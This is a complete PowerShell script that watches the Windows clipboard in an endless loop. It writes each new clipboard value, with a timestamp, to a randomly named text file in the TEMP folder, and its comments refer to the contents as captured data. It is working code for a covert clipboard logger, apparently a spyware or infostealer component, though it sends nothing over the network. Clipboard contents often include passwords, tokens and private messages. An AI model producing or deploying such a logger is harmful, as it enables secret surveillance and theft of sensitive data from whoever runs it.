# Load the Windows Forms assembly for UI elements
Add-Type -AssemblyName System.Windows.Forms

# Display a notification when the script begins
[System.Windows.Forms.MessageBox]::Show("Initialized", "Status", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)

# Create a random 8-character filename using letters
$fileAlias = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_}) # Ex.: "RxKpMnBv"
$dataStorePath = "$env:TEMP\$fileAlias.txt" # Set the storage path in the TEMP directory

# Function to record captured data to a file
function Save-CapturedData {
    param (
        [string]$data
    )
    # Generate a timestamp for the entry
    $timeMark = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $entryText = "$timeMark - $data" # Format the data with timestamp
    Add-Content -Path $dataStorePath -Value $entryText # Append to the file
}

# Variable to hold the last captured data
$lastData = ""

# Continuous loop to check the clipboard
while ($true) {
    # Fetch current clipboard contents, ignoring errors
    $currentData = Get-Clipboard -ErrorAction SilentlyContinue

    # Check if there's new data different from the last
    if ($currentData -and $currentData -ne $lastData) {
        Save-CapturedData $currentData # Save the new data
        $lastData = $currentData # Update the last captured data
    }

    # Pause briefly to avoid overloading the system
    Start-Sleep -Milliseconds 500
}